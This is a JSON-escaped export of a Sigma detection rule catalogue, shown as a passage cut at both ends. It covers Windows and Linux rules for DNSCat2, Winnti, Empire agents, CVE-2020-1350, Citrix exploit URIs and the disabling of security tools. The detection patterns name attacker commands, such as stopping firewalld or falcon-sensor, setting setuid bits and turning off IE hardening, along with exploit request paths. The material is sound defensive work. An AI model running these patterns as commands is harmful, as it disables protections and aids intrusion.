\u0026ldquo;Windows Defender Antivirus has removed history of malware and other potentially unwanted software\u0026rdquo;.\nKnown false-positives Deletion of Defender malware detections history for legitimate reasons References https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/troubleshoot-microsoft-defender-antivirus Raw rule (edit) title: Windows Defender Malware Detection History Deletion id: 2afe6582-e149-11ea-87d0-0242ac130003 status: experimental description: Windows Defender logs when the history of detected infections is deleted. Log file will contain the message \u0026#34;Windows Defender Antivirus has removed history of malware and other potentially unwanted software\u0026#34;. author: Cian Heasley references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/troubleshoot-microsoft-defender-antivirus date: 2020/08/13 modified: 2021/05/30 tags: - attack.defense_evasion - attack.t1070.001 logsource: product: windows service: windefend detection: selection: EventID: 1013 EventType: 4 condition: selection fields: - EventID - EventType falsepositives: - Deletion of Defender malware detections history for legitimate reasons level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_history_delete.yml/","tags":["attack.defense_evasion","attack.t1070.001"],"title":"Windows Defender Malware Detection History Deletion"},{"categories":null,"contents":"The PowerShell implementation of DNSCat2 calls nslookup to craft queries. Counting nslookup processes spawned by PowerShell will show hundreds or thousands of instances if PS DNSCat2 is active locally.\nKnown false-positives Other powershell scripts that call nslookup.exe References https://github.com/lukebaggett/dnscat2-powershell https://blu3-team.blogspot.com/2019/08/powershell-dns-c2-notes.html https://ragged-lab.blogspot.com/2020/06/it-is-always-dns-powershell-edition.html Raw rule (edit) title: DNSCat2 Powershell Implementation Detection Via Process Creation id: b11d75d6-d7c1-11ea-87d0-0242ac130003 status: test description: The PowerShell implementation of DNSCat2 calls nslookup to craft queries. Counting nslookup processes spawned by PowerShell will show hundreds or thousands of instances if PS DNSCat2 is active locally. author: Cian Heasley references: - https://github.com/lukebaggett/dnscat2-powershell - https://blu3-team.blogspot.com/2019/08/powershell-dns-c2-notes.html - https://ragged-lab.blogspot.com/2020/06/it-is-always-dns-powershell-edition.html date: 2020/08/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\powershell.exe\u0026#39; Image|endswith: \u0026#39;\\nslookup.exe\u0026#39; CommandLine|endswith: \u0026#39;\\nslookup.exe\u0026#39; condition: selection | count(Image) by ParentImage \u0026gt; 100 fields: - Image - CommandLine - ParentImage falsepositives: - Other powershell scripts that call nslookup.exe level: high tags: - attack.command_and_control - attack.t1071 - attack.t1071.004 - attack.t1001.003 - attack.t1041 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_dnscat2_powershell_implementation.yml/","tags":["attack.command_and_control","attack.t1071","attack.t1071.004","attack.t1001.003","attack.t1041"],"title":"DNSCat2 Powershell Implementation Detection Via Process Creation"},{"categories":null,"contents":"Detects specific process characteristics of Winnti Pipemon malware reported by ESET\nKnown false-positives Legitimate setups that use similar flags References https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/ Raw rule (edit) title: Winnti Pipemon Characteristics id: 73d70463-75c9-4258-92c6-17500fe972f2 status: stable description: Detects specific process characteristics of Winnti Pipemon malware reported by ESET author: Florian Roth, oscd.community references: - https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/ date: 2020/07/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;setup0.exe -p\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;setup.exe\u0026#39; CommandLine|endswith: - \u0026#39;-x:0\u0026#39; - \u0026#39;-x:1\u0026#39; - \u0026#39;-x:2\u0026#39; condition: 1 of selection* falsepositives: - Legitimate setups that use similar flags level: critical tags: - attack.defense_evasion - attack.t1574.002 - attack.g0044 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_winnti_pipemon.yml/","tags":["attack.defense_evasion","attack.t1574.002","attack.g0044"],"title":"Winnti Pipemon Characteristics"},{"categories":null,"contents":"Detects exploitation of DNS RCE bug reported in CVE-2020-1350 by the detection of suspicious sub process\nKnown false-positives Unknown but benign sub processes of the Windows DNS service dns.exe References https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/ https://blog.menasec.net/2019/02/threat-hunting-24-microsoft-windows-dns.html Raw rule (edit) title: DNS RCE CVE-2020-1350 id: b5281f31-f9cc-4d0d-95d0-45b91c45b487 status: test description: Detects exploitation of DNS RCE bug reported in CVE-2020-1350 by the detection of suspicious sub process author: Florian Roth references: - https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/ - https://blog.menasec.net/2019/02/threat-hunting-24-microsoft-windows-dns.html date: 2020/07/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\System32\\dns.exe\u0026#39; filter: Image|endswith: - \u0026#39;\\System32\\werfault.exe\u0026#39; - \u0026#39;\\System32\\conhost.exe\u0026#39; - \u0026#39;\\System32\\dnscmd.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown but benign sub processes of the Windows DNS service dns.exe level: critical tags: - attack.initial_access - attack.t1190 - attack.execution - attack.t1569.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2020_1350.yml/","tags":["attack.initial_access","attack.t1190","attack.execution","attack.t1569.002"],"title":"DNS RCE CVE-2020-1350"},{"categories":null,"contents":"Detects blocking of process creations originating from PSExec and WMI commands\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction?WT.mc_id=twitter#block-process-creations-originating-from-psexec-and-wmi-commands https://twitter.com/duff22b/status/1280166329660497920 Raw rule (edit) title: PSExec and WMI Process Creations Block id: 97b9ce1e-c5ab-11ea-87d0-0242ac130003 description: Detects blocking of process creations originating from PSExec and WMI commands status: experimental references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction?WT.mc_id=twitter#block-process-creations-originating-from-psexec-and-wmi-commands - https://twitter.com/duff22b/status/1280166329660497920 author: Bhabesh Raj date: 2020/07/14 modified: 2021/11/13 tags: - attack.execution - attack.lateral_movement - attack.t1047 - attack.t1569.002 logsource: product: windows service: windefend definition: \u0026#39;Requirements:Enabled Block process creations originating from PSExec and WMI commands from Attack Surface Reduction (GUID: d1e49aac-8f56-4280-b9ba-993a6d77406c)\u0026#39; detection: selection: EventID: 1121 ProcessName|endswith: - \u0026#39;\\wmiprvse.exe\u0026#39; - \u0026#39;\\psexesvc.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_psexec_wmi_asr.yml/","tags":["attack.execution","attack.lateral_movement","attack.t1047","attack.t1569.002"],"title":"PSExec and WMI Process Creations Block"},{"categories":null,"contents":"Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events.\nKnown false-positives need tuning applocker or add exceptions in SIEM References https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker https://nxlog.co/documentation/nxlog-user-guide/applocker.html Raw rule (edit) title: File Was Not Allowed To Run id: 401e5d00-b944-11ea-8f9a-00163ecd60ae status: test description: Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events. author: Pushkarev Dmitry references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker - https://nxlog.co/documentation/nxlog-user-guide/applocker.html date: 2020/06/28 modified: 2021/11/27 logsource: product: windows service: applocker detection: selection: EventID: - 8004 - 8007 condition: selection fields: - PolicyName - RuleId - RuleName - TargetUser - TargetProcessId - FilePath - FileHash - Fqbn falsepositives: - need tuning applocker or add exceptions in SIEM level: medium tags: - attack.execution - attack.t1204.002 - attack.t1059.001 - attack.t1059.003 - attack.t1059.005 - attack.t1059.006 - attack.t1059.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/applocker/win_applocker_file_was_not_allowed_to_run.yml/","tags":["attack.execution","attack.t1204.002","attack.t1059.001","attack.t1059.003","attack.t1059.005","attack.t1059.006","attack.t1059.007"],"title":"File Was Not Allowed To Run"},{"categories":null,"contents":"Detects user agent and URI paths used by empire agents\nKnown false-positives Valid requests with this exact user agent to server scripts of the defined names References https://github.com/BC-SECURITY/Empire Raw rule (edit) title: Empire UserAgent URI Combo id: b923f7d6-ac89-4a50-a71a-89fb846b4aa8 status: test description: Detects user agent and URI paths used by empire agents author: Florian Roth references: - https://github.com/BC-SECURITY/Empire date: 2020/07/13 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\u0026#39; cs-uri-query: - \u0026#39;/admin/get.php\u0026#39; - \u0026#39;/news.php\u0026#39; - \u0026#39;/login/process.php\u0026#39; cs-method: \u0026#39;POST\u0026#39; condition: selection fields: - c-uri - c-ip falsepositives: - Valid requests with this exact user agent to server scripts of the defined names level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_empire_ua_uri_combos.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"Empire UserAgent URI Combo"},{"categories":null,"contents":"Detects a flag anomaly in which regsvr32.exe uses a /i flag without using a /n flag at the same time\nKnown false-positives Unknown References https://twitter.com/sbousseaden/status/1282441816986484737?s=12 Raw rule (edit) title: Regsvr32 Flags Anomaly id: b236190c-1c61-41e9-84b3-3fe03f6d76b0 status: test description: Detects a flag anomaly in which regsvr32.exe uses a /i flag without using a /n flag at the same time author: Florian Roth references: - https://twitter.com/sbousseaden/status/1282441816986484737?s=12 date: 2019/07/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; CommandLine|contains: \u0026#39; /i:\u0026#39; filter: CommandLine|contains: \u0026#39; /n \u0026#39; condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_regsvr32_flags_anomaly.yml/","tags":["attack.defense_evasion","attack.t1218.010"],"title":"Regsvr32 Flags Anomaly"},{"categories":null,"contents":"Detects space after filename\nKnown false-positives Typos References https://attack.mitre.org/techniques/T1064 Raw rule (edit) title: Space After Filename id: 879c3015-c88b-4782-93d7-07adf92dbcb7 status: test description: Detects space after filename author: Ömer Günal references: - https://attack.mitre.org/techniques/T1064 date: 2020/06/17 modified: 2021/11/27 logsource: product: linux detection: selection1: - \u0026#39;echo \u0026#34;*\u0026#34; \u0026gt; * \u0026amp;\u0026amp; chmod +x *\u0026#39; selection2: - \u0026#39;mv * \u0026#34;* \u0026#34;\u0026#39; condition: selection1 and selection2 falsepositives: - Typos level: low tags: - attack.execution ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_space_after_filename_.yml/","tags":["attack.execution"],"title":"Space After Filename"},{"categories":null,"contents":"Detects suspicious change of file privileges with chown and chmod commands\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1166/T1166.md https://attack.mitre.org/techniques/T1166/ Raw rule (edit) title: Setuid and Setgid id: c21c4eaa-ba2e-419a-92b2-8371703cbe21 status: test description: Detects suspicious change of file privileges with chown and chmod commands author: Ömer Günal references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1166/T1166.md - https://attack.mitre.org/techniques/T1166/ date: 2020/06/16 modified: 2021/11/27 logsource: product: linux detection: selection1: - \u0026#39;*chown root*\u0026#39; selection2: - \u0026#39;* chmod u+s*\u0026#39; selection3: - \u0026#39;* chmod g+s*\u0026#39; condition: (selection1 and selection2) or (selection1 and selection3) falsepositives: - Legitimate administration activities level: low tags: - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_setgid_setuid.yml/","tags":["attack.persistence"],"title":"Setuid and Setgid"},{"categories":null,"contents":"Detects disabling security tools\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md Raw rule (edit) title: Disabling Security Tools id: e3a8a052-111f-4606-9aee-f28ebeb76776 status: experimental description: Detects disabling security tools author: Ömer Günal, Alejandro Ortuno, oscd.community date: 2020/06/17 modified: 2021/09/14 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md tags: - attack.defense_evasion - attack.t1562.004 logsource: category: process_creation product: linux detection: selection_iptables_1: Image|endswith: \u0026#39;/service\u0026#39; CommandLine|contains|all: - \u0026#39;iptables\u0026#39; - \u0026#39;stop\u0026#39; selection_iptables_2: Image|endswith: \u0026#39;/service\u0026#39; CommandLine|contains|all: - \u0026#39;ip6tables\u0026#39; - \u0026#39;stop\u0026#39; selection_iptables_3: Image|endswith: \u0026#39;/chkconfig\u0026#39; CommandLine|contains|all: - \u0026#39;iptables\u0026#39; - \u0026#39;stop\u0026#39; selection_iptables_4: Image|endswith: \u0026#39;/chkconfig\u0026#39; CommandLine|contains|all: - \u0026#39;ip6tables\u0026#39; - \u0026#39;stop\u0026#39; selection_firewall_1: Image|endswith: \u0026#39;/systemctl\u0026#39; CommandLine|contains|all: - \u0026#39;firewalld\u0026#39; - \u0026#39;stop\u0026#39; selection_firewall_2: Image|endswith: \u0026#39;/systemctl\u0026#39; CommandLine|contains|all: - \u0026#39;firewalld\u0026#39; - \u0026#39;disable\u0026#39; selection_carbonblack_1: Image|endswith: \u0026#39;/service\u0026#39; CommandLine|contains|all: - \u0026#39;cbdaemon\u0026#39; - \u0026#39;stop\u0026#39; selection_carbonblack_2: Image|endswith: \u0026#39;/chkconfig\u0026#39; CommandLine|contains|all: - \u0026#39;cbdaemon\u0026#39; - \u0026#39;off\u0026#39; selection_carbonblack_3: Image|endswith: \u0026#39;/systemctl\u0026#39; CommandLine|contains|all: - \u0026#39;cbdaemon\u0026#39; - \u0026#39;stop\u0026#39; selection_carbonblack_4: Image|endswith: \u0026#39;/systemctl\u0026#39; CommandLine|contains|all: - \u0026#39;cbdaemon\u0026#39; - \u0026#39;disable\u0026#39; selection_selinux: Image|endswith: \u0026#39;/setenforce\u0026#39; CommandLine|contains: \u0026#39;0\u0026#39; selection_crowdstrike_1: Image|endswith: \u0026#39;/systemctl\u0026#39; CommandLine|contains|all: - \u0026#39;stop\u0026#39; - \u0026#39;falcon-sensor\u0026#39; selection_crowdstrike_2: Image|endswith: \u0026#39;/systemctl\u0026#39; CommandLine|contains|all: - \u0026#39;disable\u0026#39; - \u0026#39;falcon-sensor\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administration activities level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml/","tags":["attack.defense_evasion","attack.t1562.004"],"title":"Disabling Security Tools"},{"categories":null,"contents":"Detects setting proxy\nKnown false-positives Legitimate administration activities References https://attack.mitre.org/techniques/T1090/ Raw rule (edit) title: Connection Proxy id: 72f4ab3f-787d-495d-a55d-68c2ff46cf4c status: test description: Detects setting proxy author: Ömer Günal references: - https://attack.mitre.org/techniques/T1090/ date: 2020/06/17 modified: 2021/11/27 logsource: product: linux detection: keyword: - \u0026#39;http_proxy=*\u0026#39; - \u0026#39;https_proxy=*\u0026#39; condition: keyword falsepositives: - Legitimate administration activities level: low tags: - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_proxy_connection.yml/","tags":["attack.defense_evasion"],"title":"Connection Proxy"},{"categories":null,"contents":"Detects exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195\nKnown false-positives Unknown References https://support.citrix.com/article/CTX276688 https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/ https://dmaasland.github.io/posts/citrix.html Raw rule (edit) title: Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195 description: Detects exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195 id: 0d0d9a8a-a49e-4e27-b061-7ce4b936cfb7 author: Florian Roth status: experimental date: 2020/07/10 modified: 2021/08/09 references: - https://support.citrix.com/article/CTX276688 - https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/ - https://dmaasland.github.io/posts/citrix.html logsource: category: webserver detection: selection1: c-uri|contains: \u0026#39;/rapi/filedownload?filter=path:%2F\u0026#39; selection2: c-uri|contains|all: - \u0026#39;/pcidss/report\u0026#39; - \u0026#39;type=all_signatures\u0026#39; - \u0026#39;sig_name=_default_signature_\u0026#39; condition: 1 of selection* fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_citrix_cve_2020_8193_8195_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195"},{"categories":null,"contents":"Detects Golden Chickens deployment method as used by Evilnum in report published in July 2020\nKnown false-positives Unknown References https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/ https://app.any.run/tasks/33d37fdf-158d-4930-aa68-813e1d5eb8ba/ Raw rule (edit) title: EvilNum Golden Chickens Deployment via OCX Files id: 8acf3cfa-1e8c-4099-83de-a0c4038e18f0 status: test description: Detects Golden Chickens deployment method as used by Evilnum in report published in July 2020 author: Florian Roth references: - https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/ - https://app.any.run/tasks/33d37fdf-158d-4930-aa68-813e1d5eb8ba/ date: 2020/07/10 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;regsvr32\u0026#39; - \u0026#39;/s\u0026#39; - \u0026#39;/i\u0026#39; - \u0026#39;\\AppData\\Roaming\\\u0026#39; - \u0026#39;.ocx\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_evilnum_jul20.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"EvilNum Golden Chickens Deployment via OCX Files"},{"categories":null,"contents":"Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.\nKnown false-positives unknown Raw rule (edit) title: Suspicious XOR Encoded PowerShell Command Line id: 812837bb-b17f-45e9-8bd0-0ec35d2e3bd6 description: Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands. status: experimental author: Teymur Kheirkhabarov, Harish Segar (rule) date: 2020/06/29 modified: 2021/10/16 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostName: \u0026#39;ConsoleHost\u0026#39; filter: HostApplication|contains: - \u0026#39;bxor\u0026#39; - \u0026#39;join\u0026#39; - \u0026#39;char\u0026#39; condition: selection and filter falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious XOR Encoded PowerShell Command Line"},{"categories":null,"contents":"Detects a command line process that uses explorer.exe /root, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer\nKnown false-positives Unknown how many legitimate software products use that method References https://twitter.com/CyberRaiju/status/1273597319322058752 https://twitter.com/bohops/status/1276357235954909188?s=12 Raw rule (edit) title: Explorer Root Flag Process Tree Break id: 949f1ffb-6e85-4f00-ae1e-c3c5b190d605 status: test description: Detects a command line process that uses explorer.exe /root, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer author: Florian Roth references: - https://twitter.com/CyberRaiju/status/1273597319322058752 - https://twitter.com/bohops/status/1276357235954909188?s=12 date: 2019/06/29 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;explorer.exe\u0026#39; - \u0026#39; /root,\u0026#39; condition: selection falsepositives: - Unknown how many legitimate software products use that method level: medium tags: - attack.defense_evasion - attack.t1036 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_explorer_break_proctree.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"Explorer Root Flag Process Tree Break"},{"categories":null,"contents":"Detects all actions taken by Windows Defender malware detection engines\nKnown false-positives unlikely References https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus Raw rule (edit) title: Windows Defender Threat Detected id: 57b649ef-ff42-4fb0-8bf6-62da243a1708 description: Detects all actions taken by Windows Defender malware detection engines date: 2020/07/28 author: Ján Trenčanský references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus status: stable logsource: product: windows service: windefend detection: selection: EventID: - 1006 - 1116 - 1015 - 1117 condition: selection falsepositives: - unlikely level: high tags: - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_threat.yml/","tags":["attack.execution","attack.t1059"],"title":"Windows Defender Threat Detected"},{"categories":null,"contents":"Detects disabling Windows Defender threat protection\nKnown false-positives Administrator actions References https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md Raw rule (edit) title: Windows Defender Threat Detection Disabled id: fe34868f-6e0e-4882-81f6-c43aa8f15b62 description: Detects disabling Windows Defender threat protection date: 2020/07/28 modified: 2021/09/21 author: Ján Trenčanský, frack113 references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md status: stable tags: - attack.defense_evasion - attack.t1562.001 logsource: product: windows service: windefend detection: selection: EventID: - 5001 - 5010 - 5012 - 5101 condition: selection falsepositives: - Administrator actions level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_disabled.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Windows Defender Threat Detection Disabled"},{"categories":null,"contents":"This event is generated when an authenticated user who is not allowed to log on remotely attempts to connect to this computer through Remote Desktop. Often, this event can be generated by attackers when searching for available windows servers in the network.\nKnown false-positives Valid user was not added to RDP group References https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4825 Raw rule (edit) title: Denied Access To Remote Desktop id: 8e5c03fa-b7f0-11ea-b242-07e0576828d9 status: test description: This event is generated when an authenticated user who is not allowed to log on remotely attempts to connect to this computer through Remote Desktop. Often, this event can be generated by attackers when searching for available windows servers in the network. author: Pushkarev Dmitry references: - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4825 date: 2020/06/27 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4825 condition: selection fields: - EventCode - AccountName - ClientAddress falsepositives: - Valid user was not added to RDP group level: medium tags: - attack.lateral_movement - attack.t1021.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_not_allowed_rdp_access.yml/","tags":["attack.lateral_movement","attack.t1021.001"],"title":"Denied Access To Remote Desktop"},{"categories":null,"contents":"Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features\nKnown false-positives Unknown, maybe some security software installer disables these features temporarily References https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/ Raw rule (edit) title: Disabled IE Security Features id: fb50eb7a-5ab1-43ae-bcc9-091818cb8424 status: test description: Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features author: Florian Roth references: - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/ date: 2020/06/19 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - \u0026#39; -name IEHarden \u0026#39; - \u0026#39; -value 0 \u0026#39; selection2: CommandLine|contains|all: - \u0026#39; -name DEPOff \u0026#39; - \u0026#39; -value 1 \u0026#39; selection3: CommandLine|contains|all: - \u0026#39; -name DisableFirstRunCustomize \u0026#39; - \u0026#39; -value 2 \u0026#39; condition: 1 of selection* falsepositives: - Unknown, maybe some security software installer disables these features temporarily level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_disable_ie_features.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disabled IE Security Features"},{"categories":null,"contents":"Detects Registry modifications performed by Ke3chang malware in campaigns running in 2019 and 2020\nKnown false-positives Will need to be looked for combinations of those processes References https://www.verfassungsschutz.de/embed/broschuere-2020-06-bfv-cyber-brief-2020-01.pdf https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/ Raw rule (edit) title: Ke3chang Registry Key Modifications id: 7b544661-69fc-419f-9a59-82ccc328f205 status: test description: Detects Registry modifications performed by Ke3chang malware in campaigns running in 2019 and 2020 author: Markus Neis, Swisscom references: - https://www.verfassungsschutz.de/embed/broschuere-2020-06-bfv-cyber-brief-2020-01.pdf - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/ date: 2020/06/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: # Ke3chang and TidePool both modify the IEHarden registry key, as well as the following list of keys. # Setting these registry keys is unique to the Ke3chang and TidePool malware families. # HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Check_Associations # HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize # HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEharden CommandLine|contains: - \u0026#39;-Property DWORD -name DisableFirstRunCustomize -value 2 -Force\u0026#39; - \u0026#39;-Property String -name Check_Associations -value\u0026#39; - \u0026#39;-Property DWORD -name IEHarden -value 0 -Force\u0026#39; condition: selection1 falsepositives: - Will need to be looked for combinations of those processes level: critical tags: - attack.g0004 - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_ke3chang_regadd.yml/","tags":["attack.g0004","attack.defense_evasion","attack.t1562.001"],"title":"Ke3chang Registry Key Modifications"},{"categories":null,"contents":"Detects the use of tools that copy files from or to remote systems\nKnown false-positives Legitimate administration activities References https://attack.mitre.org/techniques/T1105/ Raw rule (edit) title: Remote File Copy id: 7a14080d-a048-4de8-ae58-604ce58a795b status: stable description: Detects the use of tools that copy files from or to remote systems author: Ömer Günal date: 2020/06/18 references: - https://attack.mitre.org/techniques/T1105/ logsource: product: linux detection: tools: - \u0026#39;scp \u0026#39; - \u0026#39;rsync \u0026#39; - \u0026#39;sftp \u0026#39; filter: - \u0026#39;@\u0026#39; - \u0026#39;:\u0026#39; condition: tools and filter falsepositives: - Legitimate administration activities level: low tags: - attack.command_and_control - attack.lateral_movement - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_file_copy.yml/","tags":["attack.command_and_control","attack.lateral_movement","attack.t1105"],"title":"Remote File Copy"},{"categories":null,"contents":"detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking\nKnown false-positives (not much) some benign Java tools may product false-positive commandlines for loading libraries References https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/ https://twitter.com/Oddvarmoe/status/1270633613449723905 Raw rule (edit) title: Cmd.exe CommandLine Path Traversal id: 087790e3-3287-436c-bccf-cbd0184a7db1 status: test description: detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking author: xknow @xknow_infosec references: - https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/ - https://twitter.com/Oddvarmoe/status/1270633613449723905 date: 2020/06/11 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentCommandLine|contains|all: - \u0026#39;cmd\u0026#39; - \u0026#39;/c\u0026#39; CommandLine|contains: \u0026#39;/../../\u0026#39; condition: selection falsepositives: - (not much) some benign Java tools may product false-positive commandlines for loading libraries level: high tags: - attack.execution - attack.t1059.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_commandline_path_traversal.yml/","tags":["attack.execution","attack.t1059.003"],"title":"Cmd.exe CommandLine Path Traversal"},{"categories":null,"contents":"Detects Windows Pcap driver installation based on a list of associated .sys files.\nKnown false-positives unknown References https://ragged-lab.blogspot.com/2020/06/capturing-pcap-driver-installations.html#more Raw rule (edit) title: Windows Pcap Drivers id: 